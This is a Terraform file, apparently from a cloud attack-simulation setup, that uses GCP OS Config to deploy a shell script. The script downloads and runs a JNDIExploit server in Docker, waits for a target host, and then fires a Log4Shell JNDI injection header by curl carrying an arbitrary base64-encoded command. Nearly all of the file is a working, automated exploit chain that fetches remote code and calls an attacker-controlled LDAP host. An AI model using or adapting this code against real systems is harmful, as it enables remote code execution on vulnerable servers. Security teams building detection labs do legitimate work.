locals {
    jdniexploit_url="https://github.com/credibleforce/jndi/raw/main/jndi.base64"
    image = "openjdk:11"
    name = "jdniexploit"
    attacker_http_port=var.attacker_http_port
    attacker_ldap_port=var.attacker_ldap_port
    attacker_ip=var.attacker_ip
    target_ip=var.target_ip
    target_port=var.target_port
    base64_log4shell_payload=base64encode(
        var.payload
    )
    command_payload=<<-EOT
    bash -c "wget ${local.jdniexploit_url} && base64 -d jndi.base64 > JNDIExploit.1.2.zip && unzip JNDIExploit.*.zip && rm *.zip && java -jar JNDIExploit-*.jar --ip ${local.attacker_ip} --httpPort ${local.attacker_http_port} --ldapPort ${local.attacker_ldap_port}"
    EOT
    payload = <<-EOT
    LOGFILE=/tmp/${var.tag}.log
    function log {
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
    }
    MAXLOG=2
    for i in `seq $((MAXLOG-1)) -1 1`; do mv "$LOGFILE."{$i,$((i+1))} 2>/dev/null || true; done
    mv $LOGFILE "$LOGFILE.1" 2>/dev/null || true
    check_package_manager() {
        pgrep -f "apt" || pgrep -f "dpkg" || pgrep -f "yum" || pgrep -f "rpm"
    }
    while check_package_manager; do
        log "Waiting for package manager to be available..."
        sleep 10
    done
    log "Checking for docker..."
    while ! which docker > /dev/null || ! docker ps > /dev/null; do
        log "docker not found or not ready - waiting"
        sleep 120
    done
    log "docker path: $(which docker)"
    server="${local.attacker_ip}"
    timeout=600
    start_time=$(date +%s)
    # Check if $server is an IP address
    if [[ $server =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
        log "server is set to IP address $server, no need to resolve DNS"
    else
        log "checking dns resolution: $server"
        while true; do
            ip=$(dig +short $server)
            if [ -z "$ip" ]; then  # If $ip is empty, the domain hasn't resolved yet
                current_time=$(date +%s)
                elapsed_time=$((current_time - start_time))
                if [ $elapsed_time -gt $timeout ]; then
                    echo "DNS resolution for $server timed out after $timeout seconds"
                    exit 1
                fi
                sleep 1
            else
                echo "$server resolved to $ip"
                break
            fi
        done
    fi
    if [[ `sudo docker ps | grep ${local.name}` ]]; then docker stop ${local.name}; fi
    log "$(echo 'docker run -d --name ${local.name} --rm -p ${local.attacker_http_port}:${local.attacker_http_port} -p ${local.attacker_ldap_port}:${local.attacker_ldap_port} ${local.image} ${local.command_payload}')"
    docker run -d --name ${local.name} --rm -p ${local.attacker_http_port}:${local.attacker_http_port} -p ${local.attacker_ldap_port}:${local.attacker_ldap_port} ${local.image} ${local.command_payload} >> $LOGFILE 2>&1
    docker ps -a >> $LOGFILE 2>&1
    log "payload: curl --verbose ${local.target_ip}:${local.target_port} -H 'X-Api-Version: $${jndi:ldap://${local.attacker_ip}:${local.attacker_ldap_port}/Basic/Command/Base64/${local.base64_log4shell_payload}}'"
    log "checking target: ${local.target_ip}:${local.target_port}"
    while ! nc -z -w 5 -vv ${local.target_ip} ${local.target_port} > /dev/null; do
        log "failed check - waiting for target";
        sleep 30;
    done;
    log "target available - sending payload";
    sleep 5;
    curl --verbose ${local.target_ip}:${local.target_port} -H 'X-Api-Version: $${jndi:ldap://${local.attacker_ip}:${local.attacker_ldap_port}/Basic/Command/Base64/${local.base64_log4shell_payload}}' >> $LOGFILE 2>&1;
    echo "\n" >> $LOGFILE
    log "payload sent sleeping..."
    log "done";
    EOT
    base64_payload = base64gzip(local.payload)
}

#####################################################
# GCP OSCONFIG
#####################################################

module "osconfig" {
  source            = "../../../../../../common/gcp/osconfig/base"
  environment       = var.environment
  deployment        = var.deployment
  gcp_project_id    = var.gcp_project_id
  gcp_location      = var.gcp_location
  tag               = var.tag
  base64_payload    = local.base64_payload
}